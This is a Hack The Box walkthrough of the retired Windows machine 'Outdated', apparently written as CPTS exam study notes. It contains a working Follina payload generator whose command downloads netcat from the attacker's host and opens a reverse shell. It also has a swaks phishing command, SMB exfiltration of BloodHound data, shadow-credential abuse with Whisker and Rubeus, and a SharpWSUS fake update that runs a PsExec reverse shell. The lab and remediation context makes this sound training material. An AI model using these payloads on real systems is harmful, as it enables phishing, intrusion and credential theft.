# Outdated — Phish Follina to a WSUS malicious update for DA

[![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)](https://app.hackthebox.com/machines/outdated)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/outdated)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=TR132R1h3Ds)

> **Attack path:** SMB leak of `NOC_Reminder.pdf` (target email + CVE list) → phish `itsupport@outdated.htb` with a Follina (CVE-2022-30190) HTML link → shell as `btables` in a Hyper-V container → BloodHound → ITSTAFF `AddKeyCredentialLink` on `sflowers` → Whisker shadow credentials + Rubeus PKINIT → NTLM → WinRM to DC → WSUS Administrators → SharpWSUS malicious "update" running signed PsExec → SYSTEM on DC.

Retired box IP: `10.10.11.175`

## 1 · Reconnaissance

### Port scan

A DC-style port set, plus SMTP/IMAP (mail on the box) and 8530/8531 — the default WSUS (Windows Server Update Services) IIS ports:

```bash
nmap -p- --min-rate 10000 10.10.11.175
nmap -p 25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 -sCV 10.10.11.175
```

Key results:

- 25/587 — hMailServer `smtpd` (host `mail.outdated.htb`)
- 88/464 — Kerberos; 389/636/3268/3269 — LDAP (domain `outdated.htb`, host `DC.outdated.htb`)
- 445 — SMB, signing enabled and required
- 2179 — Hyper-V VM RDP (a hint that clients live in containers)
- 8530/8531 — IIS 10 (WSUS console / Client Web Service)

`/etc/hosts`:

```
10.10.11.175 dc.outdated.htb mail.outdated.htb outdated.htb wsus.outdated.htb
```

### SMB enumeration

Null/bad sessions can still list shares:

```bash
crackmapexec smb 10.10.11.175 -u 'guest' -p '' --shares
smbclient -L //10.10.11.175 -N
```

Besides defaults (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) there are WSUS shares (`UpdateServicesPackages`, `WsusContent`, `WSUSTemp` — note 8530 for later) and one custom share: `Shares` (READ). It holds a single file:

```bash
smbclient -N //10.10.11.175/shares
smb: \> get NOC_Reminder.pdf
```

### The PDF — target and CVE menu

`NOC_Reminder.pdf` tells us two things:

1. Links to web applications can be sent to **`itsupport@outdated.htb`** — i.e. someone clicks links you mail in.
2. NOC staff compiled a list of unpatched CVEs, including **CVE-2022-30190 (Follina)**, CVE-2022-30129 (VSCode `vscode://` RCE), CVE-2022-30138 (Print Spooler LPE), CVE-2022-29130 (LDAP RCE), CVE-2022-29110 (Excel RCE). Only Follina has a public, remotely triggerable PoC at box release — and no Office document is needed.

## 2 · Foothold

### Follina (CVE-2022-30190) primer

The `ms-msdt://` URL protocol handler passes attacker-controlled parameters to the Microsoft Diagnostic Tool. A URL padded beyond **4096 bytes** bypasses the dialogs that would normally require user interaction, giving command execution. Classic delivery is a Word doc with an external OLE reference, but here a plain **HTML page that JavaScript-redirects to the `msdt://` URL** is enough because the victim follows the link from the email.

### Generate and serve the payload

Trimmed from John Hammond's PoC (base64-encoded PowerShell command, padded past 4096 bytes):

```python
#!/usr/bin/env python3
import base64, random, string, sys

command = "IWR http://10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.14.6 443 -e cmd"
b64 = base64.b64encode(command.encode()).decode()

html = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{b64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\\"", //"""
html += "".join(random.choice(string.ascii_lowercase) for _ in range(4096)) + "\n</script>"
print(html)
```

Serve the HTML plus `nc64.exe` from the same web root:

```bash
python3 -m http.server 80
rlwrap -cAr nc -lnvp 443
```

### Send the phish with swaks

```bash
swaks --to itsupport@outdated.htb --from "0xdf@0xdf.htb" \
  --header "Subject: Internal web app" \
  --body "http://10.10.14.6/msdt.html"
```

Landmines: the mail filter drops links ending in `.doc`, and Word isn't installed anyway — the plain `.html` link is the reliable path. After two GETs (`/msdt.html`, `/nc64.exe`) a shell arrives as `outdated\btables`.

### Know where you landed

- `hostname` → `client`, `ipconfig` → `172.16.20.20` — you are in a **Hyper-V container** behind the DC (`172.16.20.1`), domain-joined to `outdated.htb`.
- The fetch User-Agent (`WindowsPowerShell/5.1.19041.906`) leaks the build: patched around March 2021, months before the June 2022 Follina patch.

## 3 · User flag

### BloodHound

```powershell
cd C:\programdata
iwr 10.10.14.6/SharpHound.exe -outfile s.exe
.\s.exe -C all
```

Exfil the zip with an impacket SMB server:

```bash
smbserver.py -smb2support share . -user 0xdf -pass <password>
```

```powershell
net use \\10.10.14.6\share /u:0xdf <password>
copy 2022*_BloodHound.zip \\10.10.14.6\share\
```

In BloodHound, `btables` → "Outbound Object Control": via the **ITSTUFF** group he has **`AddKeyCredentialLink`** on `sflowers` (Susan Flowers) — shadow credentials.

### Shadow credentials → NTLM

Whisker (eladshamir) writes a Key Credential into the victim's `msDS-KeyCredentialLink`; PKINIT then authenticates as that user and Rubeus can recover their NTLM:

```powershell
.\Whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:<password>
.\Rubeus.exe asktgt /user:sflowers /certificate:<base64-cert-from-whisker> /password:"<password>" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```

`Rubeus` returns `NTLM: <nthash>`. The pure-Linux equivalent (intended path): dump local secrets on `client` with **HiveNightmare (CVE-2021-36934)** → `secretsdump.py` → btables' password → `pywhisker.py --action add ... --use-ldaps` → `PKINITtools gettgtpkinit.py` / `getnthash.py`.

### WinRM to the DC

`sflowers` is in **Remote Management Users** (also note: **WSUS Administrators**):

```bash
evil-winrm -u sflowers -i dc.outdated.htb -H <nthash>
```

```powershell
*Evil-WinRM* PS C:\Users\sflowers\desktop> cat user.txt
<flag>
```

## 4 · Privilege escalation

### Enumerate WSUS

`sflowers` belongs to **WSUS Administrators**, and ports 8530/8531 + the `WsusContent` share already pointed at WSUS. Confirm the server from the registry or with SharpWSUS (Nettitude):

```powershell
Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate
# WUServer: http://wsus.outdated.htb:8530

.\SharpWSUS.exe locate
.\SharpWSUS.exe inspect
```

`inspect` shows one target — `dc.outdated.htb (172.16.20.1)`, i.e. the WSUS server updates **itself**.

### Weaponize WSUS

WSUS only deploys Microsoft-signed binaries, so the update payload is a legit signed Sysinternals **PsExec64.exe**:

```powershell
upload PsExec64.exe \programdata\ps.exe
upload nc64.exe \programdata\nc64.exe

.\SharpWSUS.exe create /payload:"C:\programdata\ps.exe" `
  /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" `
  /title:"CVE-2022-30190"

.\SharpWSUS.exe approve /updateid:<update-guid> /computername:dc.outdated.htb /groupname:"CriticalPatches"
```

Within roughly a minute (retry if silent) the DC checks in, runs the "patch" as a psexec-style service, and calls back:

```
C:\Windows\system32>whoami
nt authority\system
```

Cleanup so the box keeps working: `.\SharpWSUS.exe delete /updateid:<update-guid> /computername:dc.outdated.htb /groupname:"CriticalPatches"`.

## 5 · Root flag / Domain Admin

SYSTEM on the DC is game over — read the flag and own the domain:

```powershell
C:\Users\Administrator\Desktop> type root.txt
<flag>
```

```bash
secretsdump.py 'outdated.htb/administrator@10.10.11.175' -hashes :<nthash>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Unpatched Windows 10 build, Follina (CVE-2022-30190) exploitable from a link | Pre-auth-adjacent RCE on any workstation that opens a mailed URL; immediate foothold | Deploy June 2022 (KB5014692-era) patches; disable/tighten the MSDT URI protocol (`HKCR\ms-msdt`) as mitigation |
| IT staff click links mailed to `itsupport@` | Any external URL becomes code execution on a domain box | Phishing-aware process: sandbox link review, MFA, no unsolicited link-following |
| ITSTUFF granted `AddKeyCredentialLink` (write to `msDS-KeyCredentialLink`) on `sflowers` | Any ITSTAFF member can impersonate that user via PKINIT (shadow credentials) | Audit ACLs (BloodHound), remove broad write/GenericWrite-style rights on user objects |
| `sflowers` in WSUS Administrators | WSUS admin can push arbitrary signed-binary "updates" to every managed host — instant SYSTEM fleet-wide | Restrict WSUS console/DB access; segregate WSUS administration from routine admin accounts |
| HiveNightmare (CVE-2021-36934) on `client` | Any local user reads SAM/SYSTEM/SECURITY from shadow copies → credentials | Apply the July 2021 cumulative patch and the registry ACL fix (`icacls` on config hives), restrict VSS access |

## 7 · CPTS takeaways

- **Client-side attacks are in scope**: enumerate for email addresses (SMB PDFs, LDAP, OSINT) and weaponize with swaks; CPTS expects you to craft and deliver phishing payloads, not just exploit services.
- Follina works **without Office** — a bare HTML page redirecting to `ms-msdt:` with a >4096-byte payload is enough when the victim follows a link.
- Always run **SharpHound immediately** on a domain foothold; `AddKeyCredentialLink` is a first-class BloodHound edge — know the shadow-credentials workflow (Whisker/pywhisker → Rubeus/PKINITtools → NTLM).
- **WSUS abuse (SharpWSUS)** is a classic "admin-but-not-DA" escalation: WSUS Administrators ⇒ SYSTEM on update clients by deploying PsExec as a fake patch. Remember only MS-signed binaries run.
- Check *where* you landed (`ipconfig`, `hostname`): containers/inner routing (172.16.20.0/24 here) change which host your nmap targets and Kerberos/DC traffic hit.
